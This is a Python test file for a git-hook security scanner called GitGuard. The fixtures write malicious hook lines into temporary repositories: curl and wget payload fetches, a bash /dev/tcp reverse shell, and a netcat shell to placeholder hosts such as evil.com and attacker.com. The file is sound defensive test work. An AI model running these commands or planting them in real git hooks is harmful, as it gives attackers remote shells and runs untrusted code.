# Copyright © 2026 Isaiah Dallas Jefferson, Jr. AgentShroud™. All rights reserved.
# AgentShroud™ is a trademark of Isaiah Dallas Jefferson, Jr., first used in February 2026.
# Protected by common law trademark rights. Federal trademark registration pending.
# Unauthorized reproduction, distribution, or use of the AgentShroud name or brand is strictly prohibited.
"""Test Git Hook Guard."""
from __future__ import annotations


import os
import stat
import tempfile
from gateway.security.git_guard import GitGuard


class TestGitGuard:
    def _make_hook(self, repo_dir, hook_name, content):
        hooks_dir = os.path.join(repo_dir, ".git", "hooks")
        os.makedirs(hooks_dir, exist_ok=True)
        path = os.path.join(hooks_dir, hook_name)
        with open(path, "w") as f:
            f.write("#!/bin/bash\n" + content + "\n")
        os.chmod(path, stat.S_IRWXU)
        return path

    def test_clean_repo_no_findings(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, ".git", "hooks"))
            guard = GitGuard()
            findings = guard.scan_git_repository(d)
            assert len(findings) == 0

    def test_curl_in_hook_flagged(self):
        with tempfile.TemporaryDirectory() as d:
            self._make_hook(d, "pre-commit", "curl http://evil.com/payload")
            guard = GitGuard()
            findings = guard.scan_git_repository(d)
            assert len(findings) >= 1
            assert any(
                "curl" in str(f).lower() or "outbound" in str(f).lower()
                for f in findings
            )

    def test_reverse_shell_flagged(self):
        with tempfile.TemporaryDirectory() as d:
            self._make_hook(
                d, "post-checkout", "bash -i >& /dev/tcp/evil.com/8080 0>&1"
            )
            guard = GitGuard()
            findings = guard.scan_git_repository(d)
            assert len(findings) >= 1
            assert any(f.threat_level.value == "critical" for f in findings)

    def test_nc_flagged(self):
        with tempfile.TemporaryDirectory() as d:
            self._make_hook(d, "pre-push", "nc -e /bin/bash attacker.com 4444")
            guard = GitGuard()
            findings = guard.scan_git_repository(d)
            assert len(findings) >= 1

    def test_wget_flagged(self):
        with tempfile.TemporaryDirectory() as d:
            self._make_hook(d, "pre-receive", "wget http://malware.com/payload")
            guard = GitGuard()
            findings = guard.scan_git_repository(d)
            assert len(findings) >= 1

    def test_clean_hook_passes(self):
        with tempfile.TemporaryDirectory() as d:
            self._make_hook(d, "pre-commit", "echo Running tests\npytest")
            guard = GitGuard()
            findings = guard.scan_git_repository(d)
            assert len(findings) == 0

    def test_no_git_dir_returns_empty(self):
        with tempfile.TemporaryDirectory() as d:
            guard = GitGuard()
            findings = guard.scan_git_repository(d)
            assert len(findings) == 0

    def test_finding_has_file_path(self):
        with tempfile.TemporaryDirectory() as d:
            self._make_hook(d, "pre-commit", "curl http://evil.com")
            guard = GitGuard()
            findings = guard.scan_git_repository(d)
            assert len(findings) >= 1
            assert findings[0].file_path.endswith("pre-commit")
